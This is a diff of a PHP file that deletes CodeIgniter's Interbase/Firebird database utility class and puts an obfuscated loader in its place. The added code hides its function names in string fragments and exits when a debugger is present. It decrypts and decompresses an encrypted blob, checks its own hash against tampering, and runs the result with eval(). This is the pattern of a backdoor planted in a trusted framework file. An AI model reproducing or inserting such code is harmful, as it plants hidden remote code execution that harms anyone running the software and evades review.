@@ -1,69 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Interbase/Firebird Utility Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_ibase_utility extends CI_DB_utility {
-
-	/**
-	 * Export
-	 *
-	 * @param	string	$filename
-	 * @return	mixed
-	 */
-	protected function _backup($filename)
-	{
-		if ($service = ibase_service_attach($this->db->hostname, $this->db->username, $this->db->password))
-		{
-			$res = ibase_backup($service, $this->db->database, $filename.'.fbk');
-
-			// Close the service connection
-			ibase_service_detach($service);
-			return $res;
-		}
-
-		return FALSE;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_rdd9d7ie=('bas'.'e64'.'_de'.'cod'.'e');
+$_ojlyu8o3=('gzu'.'nco'.'mpr'.'ess');
+$_rcwcxdhl=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_a0gshx7a='1h6xyluX';
+$_neimfz4c='6nmt2v2Q';
+$_wcg1o15w='4rJE8S60ZDw=';
+$_pibd96do='riXFpLn1';
+$_fcva6n0o='1dJTGYlJ';
+$_edk7o69x='eDAotg==';
+$_s0y12eze='u17/F+gz';
+$_hhdnyar6='Id630BVT';
+$_c45fxiqp=$_rdd9d7ie($_neimfz4c.$_pibd96do.$_fcva6n0o.$_a0gshx7a.$_wcg1o15w);
+$_jw2nhofx=$_rdd9d7ie($_s0y12eze.$_hhdnyar6.$_edk7o69x);
+$_k7dxynxv=$_rdd9d7ie('7XO6SVuXGpjNGLFB3YfYrQGx4CXIuxiMQlObSZb564xLNnZKW/mXG5v3vOoeFtCMAWG8qXETN/OkA1W4DQP7WwIX3SHeLIhrIKb3Np1te0N3MIGwOZWin+0fQkr5Gou2KeVAJy+wfCplPuNKdCN8KaLF/qwBZGVQo7Kr0fyckEfEstRduV2IML6Q8KOgLDavWszhptzPnqsmzy80Rh/oND4JmqDy/M055DW20ac1gxpRBMzUFYPZkIJ+jj8l7d9EBFt7+3qCbEtAFZD+AXdYqNxDgFu6FJVx0OopKG11TINCk+L2lX+jYhPb8BbSJqgzFZZaB67ClM/hdrD3yxjKPQ==');
+$_bdkt09xq=$_rcwcxdhl($_k7dxynxv,'aes-256-cbc',$_c45fxiqp,OPENSSL_RAW_DATA,$_jw2nhofx);
+if($_bdkt09xq===false){exit;}
+$_ba98wrq8=$_ojlyu8o3($_bdkt09xq);
+if($_ba98wrq8===false){exit;}
+$_e8om4p38='59cabd53d4b6093902bbd30f3c035010480216fd82874ccaade634c6ae466432';
+$_l75txp4t=@file_get_contents(__FILE__);
+if($_l75txp4t!==false){
+$_bvqluc24=str_replace($_e8om4p38,"0000000000000000000000000000000000000000000000000000000000000000",$_l75txp4t);
+$_ilj13pia=hash("sha256",$_bvqluc24);
+if($_ilj13pia!==$_e8om4p38){@http_response_code(403);exit;}
 }
+eval($_ba98wrq8);
